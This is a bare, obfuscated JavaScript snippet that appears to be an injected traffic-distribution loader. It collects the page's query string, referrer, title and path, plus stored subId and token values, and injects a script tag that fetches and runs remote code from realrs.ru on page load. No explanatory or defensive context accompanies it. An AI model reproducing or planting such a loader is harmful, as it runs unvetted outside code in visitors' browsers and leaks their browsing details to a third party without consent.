<script>
    (function() {
    var name = '_bpqkk9SXwjVjLhmz';
    if (!window._bpqkk9SXwjVjLhmz) {
        window._bpqkk9SXwjVjLhmz = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://realrs.ru/D8BPT5',
            P_PATH: 'https://realrs.ru/5a901f1/postback',
        };
    }
    const _GPmyp1qv17bQk2Wq = localStorage.getItem('config');
    if (typeof _GPmyp1qv17bQk2Wq !== 'undefined' && _GPmyp1qv17bQk2Wq !== null) {
        var _qSDrrvdf15vM4cKw = JSON.parse(_GPmyp1qv17bQk2Wq);
        var _rk3CZQDSvD3Q75K4 = Math.round(+new Date()/1000);
        if (_qSDrrvdf15vM4cKw.created_at + window._bpqkk9SXwjVjLhmz.ttl < _rk3CZQDSvD3Q75K4) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _yXv5SSxXQ2DCX4Qz = localStorage.getItem('subId');
    var _mGd7njYTk7tdM543 = localStorage.getItem('token');
    var _NgwPMHxpXwsKGKTF = '?return=js.client';
        _NgwPMHxpXwsKGKTF += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _NgwPMHxpXwsKGKTF += '&se_referrer=' + encodeURIComponent(document.referrer);
        _NgwPMHxpXwsKGKTF += '&default_keyword=' + encodeURIComponent(document.title);
        _NgwPMHxpXwsKGKTF += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _NgwPMHxpXwsKGKTF += '&name=' + encodeURIComponent(name);
        _NgwPMHxpXwsKGKTF += '&host=' + encodeURIComponent(window._bpqkk9SXwjVjLhmz.R_PATH);
    if (typeof _yXv5SSxXQ2DCX4Qz !== 'undefined' && _yXv5SSxXQ2DCX4Qz && window._bpqkk9SXwjVjLhmz.unique) {
        _NgwPMHxpXwsKGKTF += '&sub_id=' + encodeURIComponent(_yXv5SSxXQ2DCX4Qz);
    }
    if (typeof _mGd7njYTk7tdM543 !== 'undefined' && _mGd7njYTk7tdM543 && window._bpqkk9SXwjVjLhmz.unique) {
        _NgwPMHxpXwsKGKTF += '&token=' + encodeURIComponent(_mGd7njYTk7tdM543);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._bpqkk9SXwjVjLhmz.R_PATH + _NgwPMHxpXwsKGKTF;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
    </script>
